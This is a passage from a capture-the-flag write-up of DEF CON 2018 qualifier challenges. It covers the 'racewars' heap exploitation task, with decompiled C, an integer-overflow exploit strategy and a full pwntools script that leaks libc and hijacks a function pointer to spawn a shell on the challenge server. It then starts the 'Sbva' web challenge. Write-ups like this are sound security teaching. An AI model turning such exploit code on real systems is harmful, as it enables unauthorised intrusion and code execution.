This ends up returning a valid tire_struct() pointer but not updating the top_chunk addr in the custom
arena struct.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;how many pairs of tires do you need?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>tires_pairs</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>tires_pairs</span> <span class=o>&lt;=</span> <span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;you need at least 4 tires to drive...&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>v5</span> <span class=o>=</span> <span class=mi>32</span> <span class=o>*</span> <span class=n>tires_pairs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v6</span> <span class=o>=</span> <span class=p>(</span><span class=n>tyre_struct</span> <span class=o>*</span><span class=p>)</span><span class=nf>get_object_memory</span><span class=p>((</span><span class=n>custom_arena</span> <span class=o>*</span><span class=p>)</span><span class=n>buffer</span><span class=p>,</span> <span class=mi>32</span> <span class=o>*</span> <span class=n>tires_pairs</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v6</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>tires_num</span> <span class=o>=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>tires_pairs</span><span class=p>;</span>
</span></span></code></pre></div><h3 class="relative group">Exploit strategy<div id=exploit-strategy class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#exploit-strategy aria-label=Anchor>#</a></span></h3><p>Ok now if we go with something like:</p><pre tabindex=0><code>choose_chassis()
choose_engine()
choose_tires() --&gt; 2**27 pairs
choose_transmission()
</code></pre><p>We should end in a state in which tires_struct and transmission_struct are allocated in the same memory area.
Modifying the tires_struct with the upgrade_tires() function should end up in overwriting the transmission->gears_num
value.
To achieve a call to system(&rsquo;/bin/sh\x00&rsquo;) we found convinient to overwrite custom function pointers implemented by the allocator,
which are used in the cleaning_up function (sub_4009F3()) showed below.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=kr>__fastcall</span> <span class=nf>cleaning_up</span><span class=p>(</span><span class=n>custom_arena</span> <span class=o>*</span><span class=n>buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>custom_arena</span> <span class=o>*</span><span class=n>ptr</span><span class=p>;</span> <span class=c1>// ST10_8
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>custom_arena</span> <span class=o>*</span><span class=n>next_arena</span><span class=p>;</span> <span class=c1>// [rsp+18h] [rbp-18h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>bin_struct</span> <span class=o>*</span><span class=n>j</span><span class=p>;</span> <span class=c1>// [rsp+20h] [rbp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>function_struct</span> <span class=o>*</span><span class=n>i</span><span class=p>;</span> <span class=c1>// [rsp+28h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=p>(</span><span class=n>function_struct</span> <span class=o>*</span><span class=p>)</span><span class=n>buffer</span><span class=o>-&gt;</span><span class=n>functions_list</span><span class=p>;</span> <span class=n>i</span><span class=p>;</span> <span class=n>i</span> <span class=o>=</span> <span class=p>(</span><span class=n>function_struct</span> <span class=o>*</span><span class=p>)</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>next_func</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>i</span><span class=o>-&gt;</span><span class=n>function</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>((</span><span class=kt>void</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=p>)(</span><span class=n>_QWORD</span><span class=p>))</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>function</span><span class=p>)(</span><span class=n>i</span><span class=o>-&gt;</span><span class=n>arg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span></code></pre></div><p>We just need to place a pointer (using of course our arbitrary write) to a struct built as follows:</p><pre tabindex=0><code>ptr_to_function
ptr_to_argument
0x00
</code></pre><p>Calculating offsets to system() and &ldquo;/bin/sh&rdquo; its easy since libc is provided with the challenge.</p><h3 class="relative group">Final exploit<div id=final-exploit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#final-exploit aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># context(log_level=&#39;debug&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc-2.23.so&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#p = process(argv=(&#39;/home/andrea/ld-2.23.so&#39;, &#39;--library-path&#39;, &#39;.&#39;, &#39;./racewars&#39;))</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;2f76febe.quals2018.oooverflow.io&#39;</span><span class=p>,</span> <span class=mi>31337</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>challenge</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;ascii&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>solution</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=n>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>h</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=o>%</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=n>n</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>candidate</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>check_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>candidate</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>candidate</span>
</span></span><span class=line><span class=cl>        <span class=n>candidate</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Challenge: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>challenge</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;n: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Solving challenge: &#34;</span><span class=si>{}</span><span class=s1>&#34;, n: </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>solution</span> <span class=o>=</span> <span class=n>solve_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Solution: </span><span class=si>{}</span><span class=s1> -&gt; </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>solution</span><span class=p>,</span> <span class=n>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>solution</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>menu</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;CHOICE: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>n</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pick_tires</span><span class=p>(</span><span class=n>pairs</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;need?&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>pairs</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pick_chassis</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;eclipse</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pick_engine</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pick_transmission</span><span class=p>(</span><span class=n>manual</span><span class=o>=</span><span class=kc>True</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;transmission?&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span> <span class=k>if</span> <span class=n>manual</span> <span class=k>else</span> <span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit_tires</span><span class=p>(</span><span class=n>width</span><span class=p>,</span> <span class=n>ratio</span><span class=p>,</span> <span class=n>construction</span><span class=p>,</span> <span class=n>diameter</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;what?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;width: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>width</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;what?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;ratio: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>ratio</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;what?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;construction (R for radial): &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>construction</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;what?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;diameter: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>diameter</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit_transmission</span><span class=p>(</span><span class=n>gear</span><span class=p>,</span> <span class=n>ratio</span><span class=p>,</span> <span class=n>confirm</span><span class=o>=</span><span class=kc>True</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;modify? &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>gear</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39; is &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>old</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;what?: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>ratio</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;0 = no)&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span> <span class=k>if</span> <span class=n>confirm</span> <span class=k>else</span> <span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>old</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pick_chassis</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>pick_engine</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pick_tires</span><span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>27</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pick_transmission</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit_tires</span><span class=p>(</span><span class=mh>0xffff</span><span class=p>,</span> <span class=mh>0xffff</span><span class=p>,</span> <span class=mh>0xffff</span><span class=p>,</span> <span class=mh>0xffff</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>write_byte</span><span class=p>(</span><span class=n>offset</span><span class=p>,</span> <span class=n>value</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>edit_transmission</span><span class=p>(</span><span class=n>offset</span><span class=p>,</span> <span class=nb>ord</span><span class=p>(</span><span class=n>value</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read_byte</span><span class=p>(</span><span class=n>offset</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>chr</span><span class=p>(</span><span class=n>edit_transmission</span><span class=p>(</span><span class=n>offset</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=kc>False</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>read_qword</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>offset</span> <span class=p>:</span> <span class=n>u64</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=n>read_byte</span><span class=p>,</span> <span class=nb>range</span><span class=p>(</span><span class=n>offset</span><span class=p>,</span> <span class=n>offset</span><span class=o>+</span><span class=mi>8</span><span class=p>))))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>heap_leak</span> <span class=o>=</span> <span class=n>read_qword</span><span class=p>(</span><span class=o>-</span><span class=mi>48</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>bin_offset</span> <span class=o>=</span> <span class=mh>0x400000</span> <span class=o>-</span> <span class=n>heap_leak</span> <span class=o>-</span> <span class=mh>0x38</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>puts</span> <span class=o>=</span> <span class=n>read_qword</span><span class=p>(</span><span class=n>bin_offset</span> <span class=o>+</span> <span class=mh>0x203020</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>puts</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>binsh</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>next</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>scratch</span> <span class=o>=</span> <span class=n>bin_offset</span> <span class=o>+</span> <span class=mh>0x203100</span>  <span class=c1>## offset to 0x603100</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=s2>&#34;scratch : &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>scratch</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>write_qword</span><span class=p>(</span><span class=n>offset</span><span class=p>,</span> <span class=n>value</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pk</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>write_byte</span><span class=p>(</span><span class=n>offset</span><span class=o>+</span><span class=n>i</span><span class=p>,</span> <span class=n>pk</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>write_qword</span><span class=p>(</span><span class=n>scratch</span><span class=p>,</span> <span class=n>system</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>write_qword</span><span class=p>(</span><span class=n>scratch</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span> <span class=n>binsh</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>write_qword</span><span class=p>(</span><span class=n>scratch</span><span class=o>+</span><span class=mi>16</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>write_qword</span><span class=p>(</span><span class=o>-</span><span class=mi>128</span><span class=p>,</span> <span class=mh>0x603100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>menu</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h3 class="relative group">Johnny thinks he&rsquo;s good, johnny just got pwned !<div id=johnny-thinks-hes-good-johnny-just-got-pwned- class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#johnny-thinks-hes-good-johnny-just-got-pwned- aria-label=Anchor>#</a></span></h3><p>Flag: <code>OOO{4 c0upl3 0f n1554n 5r205 w0uld pull 4 pr3m1um 0n3 w33k b3f0r3 r4c3 w4rz}</code></p><h2 class="relative group">Sbva<div id=sbva class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#sbva aria-label=Anchor>#</a></span></h2><blockquote><p>We offer extensive website protection that stops attackers even when the admin&rsquo;s credentials are leaked!
Try our demo page <a href=http://0da57cd5.quals2018.oooverflow.io target=_blank>http://0da57cd5.quals2018.oooverflow.io</a> with username:password <a href=mailto:admin@oooverflow.io>admin@oooverflow.io</a>:admin to see for yourself.</p></blockquote><p>On login we are redirected to <code>/wrongbrowser.php</code>, but some HTML is leaked anyway:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>HTTP/1.1 302 Found
</span></span><span class=line><span class=cl>Server: nginx/1.10.3 (Ubuntu)
</span></span><span class=line><span class=cl>Date: Mon, 14 May 2018 12:51:13 GMT
</span></span><span class=line><span class=cl>Content-Type: text/html; charset=UTF-8
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Expires: Thu, 19 Nov 1981 08:52:00 GMT
</span></span><span class=line><span class=cl>Cache-Control: no-store, no-cache, must-revalidate
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Content-Security-Policy: upgrade-insecure-requests
</span></span><span class=line><span class=cl>Location: wrongbrowser.php
</span></span><span class=line><span class=cl>Content-Length: 259
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>style</span> <span class=na>scoped</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>h1</span> <span class=p>{</span><span class=k>color</span><span class=p>:</span><span class=kc>red</span><span class=p>;}</span>
</span></span><span class=line><span class=cl>        <span class=nt>p</span> <span class=p>{</span><span class=k>color</span><span class=p>:</span><span class=kc>blue</span><span class=p>;}</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>style</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>video</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;v&#34;</span> <span class=na>autoplay</span><span class=p>&gt;</span> <span class=p>&lt;/</span><span class=nt>video</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>navigator</span><span class=p>.</span><span class=nx>battery</span><span class=p>.</span><span class=nx>charging</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;Device is charging.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
